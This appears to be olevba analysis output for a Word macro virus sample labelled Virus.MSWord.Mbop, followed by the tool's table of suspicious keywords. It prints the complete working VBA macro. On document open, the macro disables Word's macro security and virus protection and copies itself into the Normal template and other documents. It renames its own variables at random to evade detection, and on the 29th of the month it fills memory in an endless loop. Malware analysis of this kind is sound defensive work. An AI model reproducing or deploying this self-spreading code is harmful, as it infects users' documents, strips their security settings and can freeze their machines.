olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop-7788ec84a0ba109afd7885ac4781a322adea8b71
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop-7788ec84a0ba109afd7885ac4781a322adea8b71 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
bztdyubgxxrkyjpl1bztdyubgxxrkyjp = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
bztdyubgxxrkyjpfibztdyubgxxrkyjp = 7
Options.ConfirmConversions = False
Set bztdyubgxxrkyjpNtbztdyubgxxrkyjp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set bztdyubgxxrkyjpAdbztdyubgxxrkyjp = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set bztdyubgxxrkyjpTdbztdyubgxxrkyjp = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
bztdyubgxxrkyjpsebztdyubgxxrkyjp = 5
bztdyubgxxrkyjpl2bztdyubgxxrkyjp = "b"
bztdyubgxxrkyjpfnbztdyubgxxrkyjp = bztdyubgxxrkyjpfibztdyubgxxrkyjp & bztdyubgxxrkyjpsebztdyubgxxrkyjp
For bztdyubgxxrkyjpiibztdyubgxxrkyjp = 1 To bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines
If InStr(bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(bztdyubgxxrkyjpiibztdyubgxxrkyjp, 1), "Private Sub Document_Open()") <> 0 Then
bztdyubgxxrkyjpSlbztdyubgxxrkyjp = bztdyubgxxrkyjpiibztdyubgxxrkyjp
Exit For
End If
Next
bztdyubgxxrkyjpl3bztdyubgxxrkyjp = "o"
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = Trim(bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(bztdyubgxxrkyjpSlbztdyubgxxrkyjp, bztdyubgxxrkyjpSlbztdyubgxxrkyjp + bztdyubgxxrkyjpfnbztdyubgxxrkyjp))
bztdyubgxxrkyjplvbztdyubgxxrkyjp = 97
If bztdyubgxxrkyjpNtbztdyubgxxrkyjp.countoflines > 0 Then
bztdyubgxxrkyjpNlbztdyubgxxrkyjp = bztdyubgxxrkyjpNtbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpNtbztdyubgxxrkyjp.countoflines)
If InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Nt") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Sl") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Nl") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Ad") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Vc") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Td") = 0 Then
bztdyubgxxrkyjpNtbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpinbztdyubgxxrkyjp = True
End If
Else
bztdyubgxxrkyjpNtbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpinbztdyubgxxrkyjp = True
End If
bztdyubgxxrkyjphvbztdyubgxxrkyjp = 122
If bztdyubgxxrkyjpAdbztdyubgxxrkyjp.countoflines > 0 Then
bztdyubgxxrkyjpAlbztdyubgxxrkyjp = bztdyubgxxrkyjpAdbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpAdbztdyubgxxrkyjp.countoflines)
If InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Nt") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Sl") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Nl") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Ad") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Vc") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Td") = 0 Then
bztdyubgxxrkyjpAdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpiabztdyubgxxrkyjp = True
End If
Else
bztdyubgxxrkyjpAdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpiabztdyubgxxrkyjp = True
End If
bztdyubgxxrkyjpl4bztdyubgxxrkyjp = "p"
For bztdyubgxxrkyjpiibztdyubgxxrkyjp = 1 To 15
Randomize
bztdyubgxxrkyjpTnbztdyubgxxrkyjp = bztdyubgxxrkyjpTnbztdyubgxxrkyjp & Chr(Int((bztdyubgxxrkyjphvbztdyubgxxrkyjp - bztdyubgxxrkyjplvbztdyubgxxrkyjp + 1) * Rnd + bztdyubgxxrkyjplvbztdyubgxxrkyjp))
Next
bztdyubgxxrkyjpd2bztdyubgxxrkyjp = 9
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines)
bztdyubgxxrkyjpTdbztdyubgxxrkyjp.deletelines 1, bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines
Do While InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") <> 0
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = Mid(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, 1, InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") - 1) & bztdyubgxxrkyjpTnbztdyubgxxrkyjp & Mid(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") + Len("bztdyubgxxrkyjp"))
Loop
bztdyubgxxrkyjpTdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpDybztdyubgxxrkyjp = Day(Now)
bztdyubgxxrkyjpd1bztdyubgxxrkyjp = 2
bztdyubgxxrkyjpl5bztdyubgxxrkyjp = "!"
If bztdyubgxxrkyjpDybztdyubgxxrkyjp = bztdyubgxxrkyjpd1bztdyubgxxrkyjp & bztdyubgxxrkyjpd2bztdyubgxxrkyjp Then
Dim bztdyubgxxrkyjpstbztdyubgxxrkyjp()
bztdyubgxxrkyjpcabztdyubgxxrkyjp = 0
Do
ReDim Preserve bztdyubgxxrkyjpstbztdyubgxxrkyjp(bztdyubgxxrkyjpcabztdyubgxxrkyjp)
bztdyubgxxrkyjpqwbztdyubgxxrkyjp = CLng(1024)
bztdyubgxxrkyjpqabztdyubgxxrkyjp = bztdyubgxxrkyjpqwbztdyubgxxrkyjp
bztdyubgxxrkyjpqzbztdyubgxxrkyjp = bztdyubgxxrkyjpqwbztdyubgxxrkyjp * bztdyubgxxrkyjpqabztdyubgxxrkyjp
bztdyubgxxrkyjpstbztdyubgxxrkyjp(bztdyubgxxrkyjpcabztdyubgxxrkyjp) = String(bztdyubgxxrkyjpqzbztdyubgxxrkyjp, Right(bztdyubgxxrkyjpTnbztdyubgxxrkyjp, 1))
DoEvents
bztdyubgxxrkyjpcabztdyubgxxrkyjp = bztdyubgxxrkyjpcabztdyubgxxrkyjp + 1
Loop
End If
If bztdyubgxxrkyjpiabztdyubgxxrkyjp = True Or bztdyubgxxrkyjpinbztdyubgxxrkyjp = True Then
MsgBox bztdyubgxxrkyjpl1bztdyubgxxrkyjp & bztdyubgxxrkyjpl2bztdyubgxxrkyjp & bztdyubgxxrkyjpl3bztdyubgxxrkyjp & bztdyubgxxrkyjpl4bztdyubgxxrkyjp & bztdyubgxxrkyjpl5bztdyubgxxrkyjp, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
